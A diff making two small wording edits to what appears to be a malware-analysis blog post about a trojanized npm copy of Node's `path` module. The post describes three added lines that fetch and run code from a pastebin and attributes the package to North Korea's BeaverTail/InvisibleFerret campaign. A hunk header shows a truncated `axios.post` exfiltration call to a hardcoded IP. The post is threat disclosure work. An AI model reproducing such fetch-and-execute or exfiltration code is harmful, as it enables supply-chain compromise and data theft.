@@ -8,7 +8,7 @@ ecosystem: npm
 
 <img src="/assets/images/path-internal-util-beavertail.jpg" alt="Meme: a close-up of an actual beaver's scaly tail on a rock, captioned with the SNL 'More Cowbell' line — 'I've got a fever, and the only prescription is more BEAVER TAIL.' The chain's payload is, in fact, more BeaverTail." style="width: 60%; height: auto;">
 
-Nobody reads Node's `path` module. It splits filenames, it has shipped unchanged for years, and it is the last place anyone looks for trouble — which is exactly why someone copied it, byte for byte, onto npm and slipped three lines inside. Those lines turn an ordinary import into a call to a free pastebin, and they run whatever the pastebin hands back; the technique is dull copy-paste, but it doesn't matter, because the package gives itself away long before anyone reads the URL.
+Nobody reads Node's `path` module. It splits filenames, it has shipped unchanged for years, and it is the last place anyone looks for trouble — which is why someone copied it, byte for byte, onto npm and slipped three lines inside. Those lines turn an ordinary import into a call to a free pastebin, and they run whatever the pastebin hands back; the technique is dull copy-paste, but it doesn't matter, because the package gives itself away long before anyone reads the URL.
 
 ## Package metadata
 
@@ -90,7 +90,7 @@ axios.<span class="tok-fn">post</span>(<span class="tok-str">"http://216.126.225
 
 ## Attribution
 
-This is North Korea's Contagious Interview operation — the BeaverTail loader dropping the InvisibleFerret trojan — and the recovered chain proves it at the toolkit level, not on a hunch. The install line, the campaign-ID URL scheme, the numbered drop file, and the stealer's telemetry are the same kit on the same Tier.Net range as [web-dotenv](/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/) and [clx-cookieparser](/discoveries/2026/05/clx-cookieparser-dependency-twin-beavertail/), both already pinned to the group via [dprk-research.kmsec.uk](https://dprk-research.kmsec.uk/). cleave reaches that verdict on its own when the exfil path trips its Lazarus rule; this is simply a fresh instance of the kit, same operator.
+This is North Korea's Contagious Interview operation — the BeaverTail loader dropping the InvisibleFerret trojan — and the recovered chain proves it at the toolkit level, not on a hunch. The install line, the campaign-ID URL scheme, the numbered drop file, and the stealer's telemetry are the same kit on the same Tier.Net range as [web-dotenv](/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/) and [clx-cookieparser](/discoveries/2026/05/clx-cookieparser-dependency-twin-beavertail/), both already pinned to the group via [dprk-research.kmsec.uk](https://dprk-research.kmsec.uk/). cleave reaches that verdict on its own when the exfil path trips its Lazarus rule; this is a fresh instance of the kit, same operator.
 
 ## Indicators
 
